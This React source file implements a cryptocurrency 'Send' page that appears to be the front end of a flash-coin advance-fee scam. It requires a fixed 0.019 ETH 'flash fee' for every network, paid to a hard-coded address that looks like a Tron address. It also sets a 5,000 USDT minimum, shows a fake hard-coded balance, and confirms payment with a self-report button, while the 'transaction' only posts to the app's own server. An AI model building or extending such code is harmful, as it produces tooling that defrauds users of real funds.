import { useState, useEffect } from 'react';
import { useAuth } from '@/hooks/use-auth';
import { useMutation, useQuery, useQueryClient } from '@tanstack/react-query';
import { Card, CardContent } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select';
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs';
import { useToast } from '@/hooks/use-toast';
import { apiRequest } from '@/lib/queryClient';
import { Copy, QrCode, ExternalLink } from 'lucide-react';
import QRCode from 'qrcode';
import TransactionCalculator from '@/components/TransactionCalculator';
import TransactionScheduler from '@/components/TransactionScheduler';

interface GasPaymentSectionProps {
  gasFeePaid: boolean;
  onConfirmPayment: () => void;
  receiverAddress: string;
}

function GasPaymentSection({ gasFeePaid, onConfirmPayment, receiverAddress }: GasPaymentSectionProps) {
  const [qrCodeUrl, setQrCodeUrl] = useState<string>('');
  const [showQrCode, setShowQrCode] = useState(false);
  const { toast } = useToast();

  useEffect(() => {
    if (receiverAddress) {
      // Generate QR code for the wallet address
      QRCode.toDataURL(receiverAddress, {
        width: 200,
        margin: 2,
        color: {
          dark: '#000000',
          light: '#ffffff'
        }
      })
      .then(url => setQrCodeUrl(url))
      .catch(err => console.error('QR code generation failed:', err));
    }
  }, [receiverAddress]);

  const copyToClipboard = async (text: string) => {
    try {
      await navigator.clipboard.writeText(text);
      toast({
        title: "Copied!",
        description: "Wallet address copied to clipboard",
      });
    } catch (err) {
      toast({
        title: "Copy failed",
        description: "Please copy the address manually",
        variant: "destructive",
      });
    }
  };

  if (gasFeePaid) {
    return (
      <div className="glass-card bg-green-500 bg-opacity-10 border border-green-500 border-opacity-30 rounded-lg p-4">
        <div className="flex items-center space-x-3 text-green-500">
          <ExternalLink className="w-5 h-5" />
          <span className="font-semibold">Gas payment confirmed</span>
        </div>
      </div>
    );
  }

  return (
    <div className="glass-card bg-yellow-500 bg-opacity-10 border border-yellow-500 border-opacity-30 rounded-lg p-4">
      <div className="flex items-start space-x-3">
        <div className="w-6 h-6 bg-yellow-500 rounded-full flex items-center justify-center mt-1">
          <span className="text-black text-xs font-bold">!</span>
        </div>
        <div className="flex-1">
          <h4 className="font-semibold text-yellow-500 mb-2">Flash Fee Payment Required</h4>
          <p className="text-sm text-muted-foreground mb-4">Send flash fee to the address below to complete your transaction:</p>
          
          <div className="bg-secondary rounded-lg p-4 mb-4 border border-gray-700">
            <div className="flex items-center justify-between mb-2">
              <p className="text-xs text-muted-foreground">Flash Fee Receiver Address:</p>
              <div className="flex space-x-2">
                <Button
                  variant="ghost"
                  size="sm"
                  onClick={() => setShowQrCode(!showQrCode)}
                  className="text-xs h-8 px-2"
                >
                  <QrCode className="w-4 h-4 mr-1" />
                  QR
                </Button>
                <Button
                  variant="ghost"
                  size="sm"
                  onClick={() => copyToClipboard(receiverAddress)}
                  className="text-xs h-8 px-2"
                >
                  <Copy className="w-4 h-4 mr-1" />
                  Copy
                </Button>
              </div>
            </div>
            <p className="font-mono text-sm break-all bg-primary rounded p-2 mb-3">{receiverAddress}</p>
            
            {showQrCode && qrCodeUrl && (
              <div className="flex justify-center mt-3 p-3 bg-white rounded-lg">
                <img src={qrCodeUrl} alt="Wallet Address QR Code" className="w-48 h-48" />
              </div>
            )}
          </div>

          <div className="flex space-x-3">
            <Button
              onClick={onConfirmPayment}
              className="bg-yellow-500 text-black hover:bg-yellow-600 flex-1"
            >
              I've Sent the Flash Fee
            </Button>
            <Button
              variant="outline"
              onClick={() => setShowQrCode(!showQrCode)}
              className="border-yellow-500 text-yellow-500 hover:bg-yellow-500 hover:text-black"
            >
              <QrCode className="w-4 h-4" />
            </Button>
          </div>
        </div>
      </div>
    </div>
  );
}

export default function Send() {
  const { user } = useAuth();
  const { toast } = useToast();
  const queryClient = useQueryClient();
  
  const [activeTab, setActiveTab] = useState('btc');
  const [formData, setFormData] = useState({
    recipientAddress: '',
    amount: '',
    network: '',
    gasSpeed: 'medium',
  });
  const [gasFeePaid, setGasFeePaid] = useState(false);
  const [showConfirmation, setShowConfirmation] = useState(false);
  const [showProgress, setShowProgress] = useState(false);

  const { data: gasInfo = { receiverAddress: 'TQm8yS3XZHgXiHMtMWbrQwwmLCztyvAG8y', fees: { slow: '0.019 ETH', medium: '0.019 ETH', fast: '0.019 ETH' } } } = useQuery({
    queryKey: ['/api/gas-fees'],
  });

  const gasReceiver = (gasInfo as any)?.receiverAddress || 'TQm8yS3XZHgXiHMtMWbrQwwmLCztyvAG8y';
  const gasFeesData = (gasInfo as any)?.fees || { slow: '0.019 ETH', medium: '0.019 ETH', fast: '0.019 ETH' };

  const sendTransactionMutation = useMutation({
    mutationFn: async (transactionData: any) => {
      return apiRequest('POST', '/api/transactions', transactionData);
    },
    onSuccess: () => {
      queryClient.invalidateQueries({ queryKey: ['/api/transactions'] });
      setShowProgress(false);
      toast({
        title: "Transaction Sent",
        description: "Your transaction has been submitted successfully!",
      });
      // Reset form
      setFormData({
        recipientAddress: '',
        amount: '',
        network: '',
        gasSpeed: 'medium',
      });
      setGasFeePaid(false);
    },
    onError: (error: any) => {
      setShowProgress(false);
      toast({
        title: "Transaction Failed",
        description: error.message || "Failed to send transaction",
        variant: "destructive",
      });
    },
  });

  const networkOptions = {
    btc: [
      { value: 'bitcoin-mainnet', label: 'Bitcoin Mainnet' },
      { value: 'bitcoin-testnet', label: 'Bitcoin Testnet' },
    ],
    eth: [
      { value: 'ethereum-mainnet', label: 'Ethereum Mainnet' },
      { value: 'ethereum-goerli', label: 'Ethereum Goerli' },
    ],
    usdt: [
      { value: 'ethereum-erc20', label: 'Ethereum (ERC-20)' },
      { value: 'tron-trc20', label: 'Tron (TRC-20)' },
      { value: 'bsc-bep20', label: 'BSC (BEP-20)' },
    ],
    bnb: [
      { value: 'bsc-mainnet', label: 'BSC Mainnet' },
      { value: 'bsc-testnet', label: 'BSC Testnet' },
    ],
  };

  const tokenSymbols = {
    btc: 'BTC',
    eth: 'ETH',
    usdt: 'USDT',
    bnb: 'BNB',
  };

  const requiresGasPayment = (network: string) => {
    return true; // All networks now require gas payment
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!formData.recipientAddress || !formData.amount || !formData.network) {
      toast({
        title: "Validation Error",
        description: "Please fill in all required fields",
        variant: "destructive",
      });
      return;
    }

    // Check minimum transaction amount
    const amount = parseFloat(formData.amount);
    if (amount < 5000) {
      toast({
        title: "Minimum Amount Required",
        description: "Minimum transaction amount is 5,000 USDT",
        variant: "destructive",
      });
      return;
    }

    if (requiresGasPayment(formData.network) && !gasFeePaid) {
      toast({
        title: "Gas Fee Required",
        description: "Please confirm gas payment before proceeding",
        variant: "destructive",
      });
      return;
    }

    setShowConfirmation(true);
  };

  const handleConfirmTransaction = () => {
    setShowConfirmation(false);
    setShowProgress(true);

    const transactionData = {
      userId: user?.id,
      toAddress: formData.recipientAddress,
      amount: formData.amount,
      token: tokenSymbols[activeTab as keyof typeof tokenSymbols],
      network: activeTab.toUpperCase(),
      gasSpeed: formData.gasSpeed,
      gasFee: gasFeesData[formData.gasSpeed as keyof typeof gasFeesData],
      gasFeePaid: gasFeePaid,
      status: 'pending',
    };

    sendTransactionMutation.mutate(transactionData);
  };

  return (
    <div className="max-w-4xl mx-auto">
      <Card className="glass-card border-0 mb-4 sm:mb-6">
        <CardContent className="p-4 sm:p-6">
          <div className="flex items-center justify-between mb-4 sm:mb-6">
            <h3 className="text-lg sm:text-xl font-semibold">Send Cryptocurrency</h3>
            <div className="hidden sm:flex items-center space-x-2">
              <div className="w-2 h-2 bg-green-500 rounded-full"></div>
              <span className="text-sm text-muted-foreground">All networks online</span>
            </div>
          </div>

          <Tabs value={activeTab} onValueChange={setActiveTab} className="mb-4 sm:mb-6">
            <TabsList className="border-b border-gray-700 bg-transparent grid grid-cols-4 w-full">
              <TabsTrigger value="btc" className="data-[state=active]:border-b-2 data-[state=active]:border-accent text-xs sm:text-sm">
                <span className="hidden sm:inline mr-2">₿</span>
                <span className="sm:hidden">BTC</span>
                <span className="hidden sm:inline">Bitcoin</span>
              </TabsTrigger>
              <TabsTrigger value="eth" className="data-[state=active]:border-b-2 data-[state=active]:border-accent text-xs sm:text-sm">
                <span className="hidden sm:inline mr-2">Ξ</span>
                <span className="sm:hidden">ETH</span>
                <span className="hidden sm:inline">Ethereum</span>
              </TabsTrigger>
              <TabsTrigger value="usdt" className="data-[state=active]:border-b-2 data-[state=active]:border-accent text-xs sm:text-sm">
                <span className="hidden sm:inline mr-2">₮</span>
                <span className="sm:hidden">USDT</span>
                <span className="hidden sm:inline">USDT</span>
              </TabsTrigger>
              <TabsTrigger value="bnb" className="data-[state=active]:border-b-2 data-[state=active]:border-accent text-xs sm:text-sm">
                <span className="hidden sm:inline mr-2">♦</span>
                <span className="sm:hidden">BNB</span>
                <span className="hidden sm:inline">BNB</span>
              </TabsTrigger>
            </TabsList>

            {Object.keys(tokenSymbols).map((token) => (
              <TabsContent key={token} value={token}>
                <form onSubmit={handleSubmit} className="space-y-4 sm:space-y-6">
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-4 sm:gap-6">
                    <div className="space-y-2">
                      <Label htmlFor="recipientAddress">Recipient Address</Label>
                      <Input
                        id="recipientAddress"
                        value={formData.recipientAddress}
                        onChange={(e) => setFormData({ ...formData, recipientAddress: e.target.value })}
                        className="bg-primary border-gray-600 focus:border-accent"
                        placeholder="Enter wallet address"
                      />
                      <p className="text-xs text-muted-foreground">Enter a valid cryptocurrency wallet address</p>
                    </div>
                    
                    <div className="space-y-2">
                      <div className="bg-yellow-500/10 border border-yellow-500/30 rounded-lg p-3 mb-4">
                        <div className="flex items-start space-x-2">
                          <div className="w-5 h-5 bg-yellow-500 rounded-full flex items-center justify-center mt-0.5">
                            <span className="text-black text-xs font-bold">!</span>
                          </div>
                          <div>
                            <p className="text-yellow-500 font-semibold text-sm">Important Notice</p>
                            <p className="text-xs text-muted-foreground mt-1">
                              Minimum transaction amount: <strong className="text-yellow-500">5,000 USDT</strong>
                            </p>
                            <p className="text-xs text-muted-foreground">
                              Flash fee required: <strong className="text-yellow-500">0.019 ETH</strong> for all networks
                            </p>
                          </div>
                        </div>
                      </div>
                    </div>
                    
                    <div className="space-y-2">
                      <Label htmlFor="amount">Amount</Label>
                      <div className="relative">
                        <Input
                          id="amount"
                          type="number"
                          step="0.000001"
                          value={formData.amount}
                          onChange={(e) => setFormData({ ...formData, amount: e.target.value })}
                          className="bg-primary border-gray-600 focus:border-accent pr-16"
                          placeholder="0.00"
                        />
                        <div className="absolute right-3 top-3 text-muted-foreground">
                          {tokenSymbols[token as keyof typeof tokenSymbols]}
                        </div>
                      </div>
                      <p className="text-xs text-muted-foreground">
                        Available: <span className="text-green-500 font-medium">1.234 BTC</span>
                      </p>
                    </div>
                  </div>

                  <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                    <div className="space-y-2">
                      <Label htmlFor="network">Network</Label>
                      <Select value={formData.network} onValueChange={(value) => setFormData({ ...formData, network: value })}>
                        <SelectTrigger className="bg-primary border-gray-600 focus:border-accent">
                          <SelectValue placeholder="Select network" />
                        </SelectTrigger>
                        <SelectContent>
                          {networkOptions[token as keyof typeof networkOptions].map((option) => (
                            <SelectItem key={option.value} value={option.value}>
                              {option.label}
                            </SelectItem>
                          ))}
                        </SelectContent>
                      </Select>
                    </div>
                    
                    <div className="space-y-2">
                      <Label htmlFor="gasSpeed">Gas Fee Speed</Label>
                      <Select value={formData.gasSpeed} onValueChange={(value) => setFormData({ ...formData, gasSpeed: value })}>
                        <SelectTrigger className="bg-primary border-gray-600 focus:border-accent">
                          <SelectValue />
                        </SelectTrigger>
                        <SelectContent>
                          <SelectItem value="slow">Slow (0.019 ETH)</SelectItem>
                          <SelectItem value="medium">Medium (0.019 ETH)</SelectItem>
                          <SelectItem value="fast">Fast (0.019 ETH)</SelectItem>
                        </SelectContent>
                      </Select>
                    </div>
                  </div>

                  {requiresGasPayment(formData.network) && (
                    <GasPaymentSection
                      gasFeePaid={gasFeePaid}
                      onConfirmPayment={() => setGasFeePaid(true)}
                      receiverAddress={gasReceiver}
                    />
                  )}

                  <div className="flex items-center justify-between pt-4 border-t border-gray-700">
                    <div className="text-sm text-muted-foreground">
                      <p>Transaction Fee: <span className="text-yellow-500 font-medium">
                        {gasFeesData[formData.gasSpeed as keyof typeof gasFeesData]}
                      </span></p>
                      <p>Estimated Time: <span className="text-accent font-medium">2-5 minutes</span></p>
                    </div>
                    
                    <Button
                      type="submit"
                      className="bg-gradient-to-r from-green-500 to-green-600 hover:from-green-600 hover:to-green-500"
                      disabled={sendTransactionMutation.isPending}
                    >
                      Send Transaction
                    </Button>
                  </div>
                </form>
              </TabsContent>
            ))}
          </Tabs>
        </CardContent>
      </Card>

      {showConfirmation && (
        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
          <div className="glass-card bg-secondary border border-gray-700 rounded-lg p-6 max-w-sm w-full mx-4">
            <h3 className="text-lg font-semibold mb-4">Confirm Transaction</h3>
            <div className="space-y-2 text-sm mb-6">
              <div className="flex justify-between">
                <span>Amount:</span>
                <span>{formData.amount} {tokenSymbols[activeTab as keyof typeof tokenSymbols]}</span>
              </div>
              <div className="flex justify-between">
                <span>To:</span>
                <span className="font-mono text-xs">{formData.recipientAddress.substring(0, 10)}...</span>
              </div>
              <div className="flex justify-between">
                <span>Gas Fee:</span>
                <span className="text-yellow-500">{gasFeesData[formData.gasSpeed as keyof typeof gasFeesData]}</span>
              </div>
            </div>
            <div className="flex space-x-3">
              <Button
                onClick={() => setShowConfirmation(false)}
                variant="secondary"
                className="flex-1"
              >
                Cancel
              </Button>
              <Button
                onClick={handleConfirmTransaction}
                className="flex-1 bg-green-500 hover:bg-green-600"
              >
                Confirm
              </Button>
            </div>
          </div>
        </div>
      )}

      {showProgress && (
        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
          <div className="glass-card bg-secondary border border-gray-700 rounded-lg p-8 max-w-sm w-full mx-4 text-center">
            <div className="w-16 h-16 border-4 border-accent border-t-transparent rounded-full animate-spin mx-auto mb-4"></div>
            <h3 className="text-lg font-semibold mb-2">Processing Transaction</h3>
            <p className="text-muted-foreground">Please wait while your transaction is being processed...</p>
          </div>
        </div>
      )}

      {/* New Enhanced Features Section */}
      <div className="mt-8 space-y-6">
        {/* Transaction Calculator */}
        <TransactionCalculator />
        
        {/* Transaction Scheduler */}
        <TransactionScheduler />
      </div>
    </div>
  );
}
